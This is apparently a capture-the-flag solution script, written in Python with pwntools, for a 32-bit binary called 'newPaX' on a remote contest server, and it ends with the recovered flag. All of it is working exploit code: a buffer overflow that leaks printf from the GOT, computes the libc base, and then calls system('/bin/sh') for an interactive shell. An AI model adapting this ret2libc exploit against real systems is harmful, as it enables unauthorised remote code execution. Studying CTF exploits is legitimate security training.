from pwn import *

elf = ELF("newPaX")
libc = ELF("libc-2.27.so")
r = remote("pwn.darkarmy.xyz", 5001)
offset = 0x34
print()

log.info("leaking libc_base...")
payload = b'A' * offset
payload += p32(elf.plt['printf'])
payload += p32(elf.sym['main'])
payload += p32(elf.got['printf'])

r.sendline(payload)

printf = u32(r.recv(4))
log.info("printf leaked")
log.success("printf --> %s\n\n" % hex(printf))
libc_base = printf - libc.sym['printf']
log.info("libc_base leaked")
log.success("libc_base --> %s\n\n" % hex(libc_base))
system = libc_base + libc.sym['system']
log.info("system --> %s\n\n" % hex(system))
binsh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'A' * offset
payload += p32(system)
payload += b'AAAA'
payload += p32(binsh)

r.sendline(payload)
r.interactive()

# FLAG --> darkCTF{f1n4lly_y0u_r3s0lv3_7h1s_w17h_dlr3s0lv3}
